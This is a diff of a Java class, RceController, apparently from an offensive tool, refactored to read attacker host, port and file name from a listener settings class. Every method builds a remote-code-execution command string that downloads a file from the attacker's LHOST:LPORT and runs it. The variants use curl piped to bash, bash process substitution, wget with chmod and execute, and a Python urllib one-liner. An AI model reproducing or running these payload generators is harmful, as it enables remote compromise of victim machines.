@@ -1,5 +1,7 @@
 package com.swordHostDemo.controller;
 
+import com.swordHostDemo.pojo.menuBeanListener;
+
 /**
  * @date: 2023/1/2 14:33
  * @description:
@@ -7,35 +9,35 @@ package com.swordHostDemo.controller;
 public class RceController {
     public static String cdCommand = "cd /tmp" + "\r\n";
     //Curl
-    public static String Curl1Command(String Lhost, String Lport, String FileName) {
-        String curl1 = "curl -fsSL http://" + Lhost + ":" + Lport + "/" + FileName + " | bash";
+    public static String Curl1Command() {
+        String curl1 = "curl -fsSL http://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLport() + "/" + menuBeanListener.getFileName() + " | bash";
         return curl1;
     }
 
-    public static String Curl2Command(String Lhost, String Lport, String FileName) {
-        String curl2 = "bash < <( curl http://" + Lhost + ":" + Lport + "/" + FileName + ")";
+    public static String Curl2Command() {
+        String curl2 = "bash < <( curl http://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLport() + "/" + menuBeanListener.getFileName()  + ")";
         return curl2;
     }
 
     //wget
-    public static String Wget1Command(String Lhost, String Lport, String FileName) {
+    public static String Wget1Command() {
         String wget1 = cdCommand +
-                "wget http://" + Lhost + ":" + Lport + "/" + FileName + "\r\n" +
-                "chmod +x " + FileName + "\r\n" +
-                "./" + FileName;
+                "wget http://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLport() + "/" + menuBeanListener.getFileName()  + "\r\n" +
+                "chmod +x " + menuBeanListener.getFileName()  + "\r\n" +
+                "./" + menuBeanListener.getFileName() ;
         return wget1;
     }
 
 
 
     //Python
-    public static String pythonCommand(String Lhost, String Lport, String FileName) {
+    public static String pythonCommand() {
         String python1 = cdCommand+
                 "python -c \"import urllib.request;urllib.request.urlretrieve('http://" +
-                Lhost + ":" + Lport + "/" + FileName + "','" + FileName + "');print('successful');\""
+                menuBeanListener.getLhost() + ":" + menuBeanListener.getLport() + "/" + menuBeanListener.getFileName() + "','" + menuBeanListener.getFileName() + "');print('successful');\""
                 + "\r\n" +
-                "chmod +x " + FileName + "\r\n" +
-                "./" + FileName;
+                "chmod +x " + menuBeanListener.getFileName() + "\r\n" +
+                "./" + menuBeanListener.getFileName();
         return python1;
     }
 
